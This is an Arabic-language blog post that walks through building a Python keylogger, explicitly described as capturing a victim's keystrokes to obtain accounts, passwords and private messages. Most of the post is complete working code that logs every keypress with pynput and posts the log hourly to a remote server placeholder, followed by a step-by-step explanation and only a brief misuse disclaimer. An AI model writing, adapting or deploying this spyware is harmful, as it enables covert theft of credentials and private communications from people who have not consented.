---

title: "Keylogger with Python in Arabic"
date: 2025-03-24
authors: "Farouk"
layout: post
categories: Python_for_Hackers
tags: [Python, Keylogger, Security, PenetrationTesting, Hacker]
direction: rtl
image:
  path: /images/HTB/e143-keylogger.gif
  alt: image alternative tex
description: ؟ وكيف بشتغل؟ وكيف فينا نساويه بأيدنا؟ Keylogger شو هو ال
---
<script>
document.addEventListener("DOMContentLoaded", function () {
    // البحث عن العنصر الذي يحتوي على "By"
    let authorElement = document.querySelector("span em");

    // التأكد أن العنصر موجود
    if (authorElement) {
        authorElement.textContent = "Farouk"; // وضع الاسم داخل الوسم <em>
    }
});
</script>

<h2 id="كيف-تكتب-keylogger-بسيط-بالـ-python" dir="rtl"><span class="me-2"><strong>كيف تكتب Keylogger بسيط بالـ Python؟</strong></span><a href="#كيف-تكتب-keylogger-بسيط-بالـ-python" class="anchor text-muted"></a></h2>

<h3 id="-المقدمة" dir="rtl"><span class="me-2"><strong>💡 المقدمة</strong></span><a href="#-المقدمة" class="anchor text-muted"></a></h3>

<p dir="rtl">اول شي خلونا نفهم شو يعني <strong>Keylogger</strong> , ال <strong>Keylogger</strong> هو عبارة عن برنامج بسجل عندي ضغطات الكيبورد تبع الضحية وهيك بقدر اعرف الحسابات وكلمات السر او حتى الرسائل الخاصة.
واليوم رح نعمل سوا <strong>Keylogger بسيط بلغة Python</strong> ونتعرف على آلية عمله بالتفصيل.</p>

<p dir="rtl">📌 <strong>رح يغطي هذا الدرس:</strong></p>
<ul dir="rtl">
<li> كيف بتسجل ضغطات الكيبورد باستخدام مكتبة pynput </li>
<li> تخزين هالبيانات ضمن ملف </li>
<li> كيف نبعت هالملف من جهاز الضحية للسيرفر الخاص فينا </li>
<li> تشغيل برنامجنا  <strong>كبرنامج مستمر</strong> يضل شغال بال <strong>Background</strong> </li>
</ul>

---

<h3 id="-الكود-كامل-keylogger-بالبايثون" dir='rtl'><span class="me-2"><strong> الكود كامل: Keylogger بالبايثون</strong></span><a href="#-الكود-كامل-keylogger-بالبايثون" class="anchor text-muted"></a></h3>

```python
import requests
import threading
from pynput.keyboard import Key, Listener

# رابط السيرفر لاستقبال البيانات
SERVER_URL = "http://your-server.com/logs"  # استبدله برابط السيرفر الخاص بك

def write_to_file(key):
    """
    تخزين ضغطات المفاتيح في ملف log.txt
    """
    try:
        keydata = str(key).replace("'", "")

        # التعامل مع المفاتيح الخاصة
        if key == Key.space:
            keydata = ' '
        elif key == Key.enter:
            keydata = '\n'
        elif key in (Key.shift, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            keydata = ''  # تجاهل مفاتيح التعديل

        # حفظ المفاتيح في الملف
        with open('log.txt', 'a') as f:
            f.write(keydata)
    
    except Exception as e:
        print(f"Error: {e}")

def send_logs():
    """
    إرسال البيانات المخزنة إلى السيرفر كل ساعة
    """
    try:
        with open("log.txt", "r") as f:
            logs = f.read()
        
        if logs.strip():  # الإرسال فقط إذا كان هناك بيانات
            response = requests.post(SERVER_URL, data={"logs": logs})
            if response.status_code == 200:
                print("Logs sent successfully!")
                open("log.txt", "w").close()  # مسح الملف بعد الإرسال
            else:
                print(f"Failed to send logs, status code: {response.status_code}")
    
    except Exception as e:
        print(f"Error sending logs: {e}")

    # جدولة إعادة التنفيذ كل ساعة
    threading.Timer(3600, send_logs).start()

# بدء الإرسال التلقائي
send_logs()

# تشغيل الـ Keylogger
with Listener(on_press=write_to_file) as listener:
    listener.join()
```

---

<h3 id="تحليل-الكود" dir='rtl'><span class="me-2"><strong>تحليل الكود</strong></span><a href="#تحليل-الكود" class="anchor text-muted"></a></h3>

<p dir="rtl">📌 <strong>1. تسجيل ضغطات المفاتيح:</strong></p>
<ul dir="rtl">
  <li>مكتبة الpynput بتساعدني لتسجيل كل <strong>ضغطة زر</strong> عالكيبورد وتحليلها.</li>
  <li>المفاتيح الخاصة (مثل Shift و Enter) منتعامل معها بطريقة مناسبة.</li>
  <li><strong>منحفظ كل ضغطة عالكيبورد</strong> بملف log.txt.</li>
</ul>

<p dir="rtl">📌 <strong>2. إرسال البيانات إلى سيرفر:</strong></p>
<ul dir="rtl">
  <li>منقرأ محتوى ملف log.txt كل <strong>ساعة</strong>.</li>
  <li>إذا كان عندي بيانات، فبيبعتلي ياها ل  <strong>السيرفر</strong> عبر requests.post().</li>
  <li>بعد ما يتم الارسال بقلو <strong>يمسحلي الملف</strong> حتى مايصير عندي تكرار بالإرسال.</li>
</ul>

<p dir="rtl">📌 <strong>3. تشغيل الكي لوجر بالخلفية:</strong></p>
<ul dir="rtl">
  <li>استخدمت threading.Timer حتى يضل عم يرسل البيانات بشكل دوري.</li>
  <li>Listener بضل شغال حتى حدا <strong>يوقف البرنامج يدويًا</strong>.</li>
</ul>

<hr />


---

<h3 id="الخاتمة" dir="rtl"><span class="me-2"><strong>الخاتمة</strong></span><a href="#الخاتمة" class="anchor text-muted"></a></h3>

<p dir='rtl'>هيك صار عندك <strong>Keylogger بسيط وفعال</strong> وهاد الشي حتى تفهم آلية عمله ويكون عندك الفهم البرمجي لطريقة عمله, فلا تستخدموا بطريقة غلط🌚.</p>

<p dir='rtl'><strong>وهلق خبرني شو رأيك بالكود؟ وهل عندك أفكار لتطويره؟🤔</strong></p>


---

<script src="https://giscus.app/client.js"
        data-repo="Farouk9423/farouk9423.github.io"
        data-repo-id="R_kgDOONQTbg"
        data-category="General"
        data-category-id="DIC_kwDOONQTbs4CqhWL"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="preferred_color_scheme"
        data-lang="ar"
        crossorigin="anonymous"
        async>
</script>